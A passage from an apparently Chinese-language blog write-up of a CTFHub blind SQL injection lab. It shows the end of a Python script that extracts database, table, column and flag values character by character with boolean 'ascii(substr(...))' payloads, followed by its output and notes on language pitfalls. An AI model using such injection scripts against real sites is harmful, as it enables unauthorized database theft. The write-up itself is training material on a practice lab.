+</span>    <span class="n">sql_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"select </span><span class="si">{</span><span class="n">column_name</span><span class="si">}</span><span class="s"> from </span><span class="si">{</span><span class="n">table_name</span><span class="si">}</span><span class="s">"</span>
+
+    <span class="c1"># all visible character is: 32( )-&gt;126(~)
+</span>    <span class="n">j</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="k">while</span> <span class="ow">not</span> <span class="n">exit_flag</span><span class="p">:</span>
+        <span class="c1"># always assume we will exit in this loop
+</span>        <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="n">low</span> <span class="o">=</span> <span class="mi">32</span>
+        <span class="n">high</span> <span class="o">=</span> <span class="mi">126</span>
+        <span class="k">while</span> <span class="n">high</span> <span class="o">&gt;=</span> <span class="n">low</span><span class="p">:</span>
+            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"1 and ascii(substr((</span><span class="si">{</span><span class="n">sql_payload</span><span class="si">}</span><span class="s">),</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">,</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">))=</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s">"</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">base_url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">mark</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">'flag:'</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>
+                <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">False</span>
+                <span class="k">break</span>
+            <span class="k">pass</span>
+
+            <span class="c1"># another test for narrow down left or right range to search
+</span>            <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"1 and ascii(substr((</span><span class="si">{</span><span class="n">sql_payload</span><span class="si">}</span><span class="s">),</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">,</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s">"</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">base_url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">mark</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">-</span> <span class="mi">1</span>
+            <span class="k">pass</span>
+        <span class="n">j</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">return</span> <span class="n">flag</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"probe db_name:"</span><span class="p">)</span>
+    <span class="n">measure_time</span><span class="p">(</span><span class="k">lambda</span><span class="p">:</span> <span class="n">probe_database_binary</span><span class="p">())</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">probe table_name:"</span><span class="p">)</span>
+    <span class="n">measure_time</span><span class="p">(</span><span class="k">lambda</span><span class="p">:</span> <span class="n">probe_table_binary</span><span class="p">(</span><span class="n">db_name</span><span class="o">=</span><span class="s">"sqli"</span><span class="p">))</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">probe column_name:"</span><span class="p">)</span>
+    <span class="n">measure_time</span><span class="p">(</span><span class="k">lambda</span><span class="p">:</span> <span class="n">probe_column_binary</span><span class="p">(</span><span class="n">table_name</span><span class="o">=</span><span class="s">"flag"</span><span class="p">))</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">probe flag:"</span><span class="p">)</span>
+    <span class="n">measure_time</span><span class="p">(</span><span class="k">lambda</span><span class="p">:</span> <span class="n">probe_flag</span><span class="p">(</span><span class="n">table_name</span><span class="o">=</span><span class="s">"flag"</span><span class="p">,</span> <span class="n">column_name</span><span class="o">=</span><span class="s">"flag"</span><span class="p">))</span>
+
+</code></pre></div></div>
+
+<p>输出结果如下：</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>probe db_name:
+database: s
+database: sq
+database: sql
+database: sqli
+Time: 56.579747915267944 seconds
+
+probe table_name:
+table: n
+table: ne
+table: new
+table: news
+table: news,
+table: news,f
+table: news,fl
+table: news,fla
+table: news,flag
+Time: 94.11818170547485 seconds
+
+probe column_name:
+column: f
+column: fl
+column: fla
+column: flag
+Time: 46.16322708129883 seconds
+
+probe flag:
+flag: c
+flag: ct
+flag: ctf
+flag: ctfh
+flag: ctfhu
+flag: ctfhub
+flag: ctfhub<span class="o">{</span>
+flag: ctfhub<span class="o">{</span>8
+flag: ctfhub<span class="o">{</span>85
+flag: ctfhub<span class="o">{</span>851
+flag: ctfhub<span class="o">{</span>851b
+flag: ctfhub<span class="o">{</span>851b6
+flag: ctfhub<span class="o">{</span>851b66
+flag: ctfhub<span class="o">{</span>851b66a
+flag: ctfhub<span class="o">{</span>851b66af
+flag: ctfhub<span class="o">{</span>851b66af4
+flag: ctfhub<span class="o">{</span>851b66af41
+flag: ctfhub<span class="o">{</span>851b66af41f
+flag: ctfhub<span class="o">{</span>851b66af41ff
+flag: ctfhub<span class="o">{</span>851b66af41ff5
+flag: ctfhub<span class="o">{</span>851b66af41ff53
+flag: ctfhub<span class="o">{</span>851b66af41ff531
+flag: ctfhub<span class="o">{</span>851b66af41ff5312
+flag: ctfhub<span class="o">{</span>851b66af41ff5312b
+flag: ctfhub<span class="o">{</span>851b66af41ff5312b8
+flag: ctfhub<span class="o">{</span>851b66af41ff5312b81
+flag: ctfhub<span class="o">{</span>851b66af41ff5312b816
+flag: ctfhub<span class="o">{</span>851b66af41ff5312b8167
+flag: ctfhub<span class="o">{</span>851b66af41ff5312b81674
+flag: ctfhub<span class="o">{</span>851b66af41ff5312b816748
+flag: ctfhub<span class="o">{</span>851b66af41ff5312b8167487
+flag: ctfhub<span class="o">{</span>851b66af41ff5312b8167487<span class="o">}</span>
+Time: 335.36650919914246 seconds
+</code></pre></div></div>
+
+<p><strong>PS1：</strong> 可以注意到，这个时间比本地的 Docker 的环境慢了很多。那是因为 CTFHub 一次的请求最大就是这么多。若是本地无限制跑，速度也是很快的。</p>
+
+<p><strong>PS2：</strong> 无法“完全自动化”。必须有一个类似于 sqlmap 那样的交互过程。毕竟你所需要的表、列与字段都是不确定的。</p>
+
+<h1 id="总结">总结</h1>
+
+<ol>
+  <li>
+    <p>坑点总结</p>
+
+    <ul>
+      <li>
+        <p>Python 的 requests 库的 params 不能用。需要通过字符串拼接的方式完成，但是不需要手动编码。</p>
+      </li>
+      <li>
+        <p>Golang 的 <code class="language-plaintext highlighter-rouge">net/http</code> 会截断空格，需要手动编码。</p>
+      </li>
+      <li>
+        <p>Rust 无坑点</p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>在几个语言里，都有衡量时间的函数来 handle。具体可以参考另一篇文章：</p>
+
+    <p><a href="/blog/%E4%BC%98%E9%9B%85%E6%B5%8B%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E6%97%B6%E9%97%B4-Rust-Golang-Python/">优雅测函数执行时间（Rust-Golang-Python）</a></p>
+  </li>
+  <li>
+    <p>希望以上内容对你有帮助。</p>
+  </li>
+</ol>
+
+<center><blockquote>The End</blockquote></center>
+
+
+  <!-- POST NAVIGATION -->
+  <footer class="postNav clearfix"><a class="prev" href="/blog/Rust-DFS%E7%BB%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B7%BB%E5%8A%A0%E8%BF%90%E7%AE%97%E7%AC%A6/"><span>&laquo;&nbsp;Rust-DFS 给表达式添加运算符</span></a><a class="next" href="/blog/measure-function-execution-time-in-rust(python-golang)/"><span>Measure function execution time elegantly in Rust(Python, Golang)&nbsp;&raquo;</span></a></footer>
+</article>
+      </div>
+   </div><!-- end .content --><div class="footer">
+	<div class="container">
+		<p class="copy">
+			&copy;2017-2022
+					<a href="https://godeep.pro/about">Gabriel Farnsworth</a>.
+				Powered by <a href="http://jekyllrb.com">Jekyll</a>.
+			Theme by <a href="https://github.com/brianmaierjr/long-haul">Long-haul</a>.<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">Visits: <span id="busuanzi_value_site_pv"></span></span></p>
+
+		<div class="footer-links">
+			<ul class="noList"><li>
+					<a href="https://github.com/gabirel" target="_blank">
+						<svg id="github" class="custom-icon" version="1.1" xmlns="http://www.w3.org/2000/svg"
+							xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 100 100"
+							style="height: 30px; width: 30px;">
+							<circle class="outer-shape" cx="50" cy="50" r="48" style="opacity: 1;"></circle>
+							<path class="inner-shape" style="opacity: 1;" transform="translate(25,25) scale(0.5)"
+								d="M50,1C22.938,1,1,22.938,1,50s21.938,49,49,49s49-21.938,49-49S77.062,1,50,1z M79.099,79.099 c-3.782,3.782-8.184,6.75-13.083,8.823c-1.245,0.526-2.509,0.989-3.79,1.387v-7.344c0-3.86-1.324-6.699-3.972-8.517 c1.659-0.16,3.182-0.383,4.57-0.67c1.388-0.287,2.855-0.702,4.402-1.245c1.547-0.543,2.935-1.189,4.163-1.938 c1.228-0.75,2.409-1.723,3.541-2.919s2.082-2.552,2.847-4.067s1.372-3.334,1.818-5.455c0.446-2.121,0.67-4.458,0.67-7.01 c0-4.945-1.611-9.155-4.833-12.633c1.467-3.828,1.308-7.991-0.478-12.489l-1.197-0.143c-0.829-0.096-2.321,0.255-4.474,1.053 c-2.153,0.798-4.57,2.105-7.249,3.924c-3.797-1.053-7.736-1.579-11.82-1.579c-4.115,0-8.039,0.526-11.772,1.579 c-1.69-1.149-3.294-2.097-4.809-2.847c-1.515-0.75-2.727-1.26-3.637-1.532c-0.909-0.271-1.754-0.439-2.536-0.503 c-0.782-0.064-1.284-0.079-1.507-0.048c-0.223,0.031-0.383,0.064-0.478,0.096c-1.787,4.53-1.946,8.694-0.478,12.489 c-3.222,3.477-4.833,7.688-4.833,12.633c0,2.552,0.223,4.889,0.67,7.01c0.447,2.121,1.053,3.94,1.818,5.455 c0.765,1.515,1.715,2.871,2.847,4.067s2.313,2.169,3.541,2.919c1.228,0.751,2.616,1.396,4.163,1.938 c1.547,0.543,3.014,0.957,4.402,1.245c1.388,0.287,2.911,0.511,4.57,0.67c-2.616,1.787-3.924,4.626-3.924,8.517v7.487 c-1.445-0.43-2.869-0.938-4.268-1.53c-4.899-2.073-9.301-5.041-13.083-8.823c-3.782-3.782-6.75-8.184-8.823-13.083 C9.934,60.948,8.847,55.56,8.847,50s1.087-10.948,3.231-16.016c2.073-4.899,5.041-9.301,8.823-13.083s8.184-6.75,13.083-8.823 C39.052,9.934,44.44,8.847,50,8.847s10.948,1.087,16.016,3.231c4.9,2.073,9.301,5.041,13.083,8.823 c3.782,3.782,6.75,8.184,8.823,13.083c2.143,5.069,3.23,10.457,3.23,16.016s-1.087,10.948-3.231,16.016 C85.848,70.915,82.88,75.317,79.099,79.099L79.099,79.099z">
+							</path>
+						</svg>
+					</a>
+				</li><li>
+					<a href="mailto:godeeppro@pm.me" target="_blank">
+						<svg id="mail" class="custom-icon" version="1.1" xmlns="http://www.w3.org/2000/svg"
+							xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 100 100"
+							style="height: 30px; width: 30px;">
+							<circle class="outer-shape" cx="50" cy="50" r="48" style="opacity: 1;"></circle>
+							<path class="inner-shape" style="opacity: 1;" transform="translate(25,25) scale(0.5)"
+								d="M50,1C22.938,1,1,22.938,1,50s21.938,49,49,49s49-21.938,49-49S77.062,1,50,1z M25.5,25.5h49 c0.874,0,1.723,0.188,2.502,0.542L50,57.544L22.998,26.041C23.777,25.687,24.626,25.499,25.5,25.5L25.5,25.5z M19.375,68.375v-36.75 c0-0.128,0.005-0.256,0.014-0.383l17.96,20.953L19.587,69.958C19.448,69.447,19.376,68.916,19.375,68.375L19.375,68.375z M74.5,74.5 h-49c-0.541,0-1.072-0.073-1.583-0.212l17.429-17.429L50,66.956l8.653-10.096l17.429,17.429C75.572,74.427,75.041,74.5,74.5,74.5 L74.5,74.5z M80.625,68.375c0,0.541-0.073,1.072-0.211,1.583L62.652,52.195l17.96-20.953c0.008,0.127,0.014,0.255,0.014,0.383 L80.625,68.375L80.625,68.375z">
+							</path>
+						</svg>
+					</a>
+				</li></ul>
+		</div>
+	</div>
+</div>
+<!-- end .footer --><!-- Add jQuery and other scripts -->
+<!-- seems to no need to load jquery from network -->
+<!-- <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script> -->
+<script>window.jQuery || document.write('<script src="/assets/js/jquery-1.11.2.min.js"><\/script>')</script>
+<script src="/assets/js/dropcap.min.js"></script>
+<script src="/assets/js/responsive-nav.min.js"></script>
+<script src="/assets/js/scripts.js"></script>
+</body>
+
+</html>
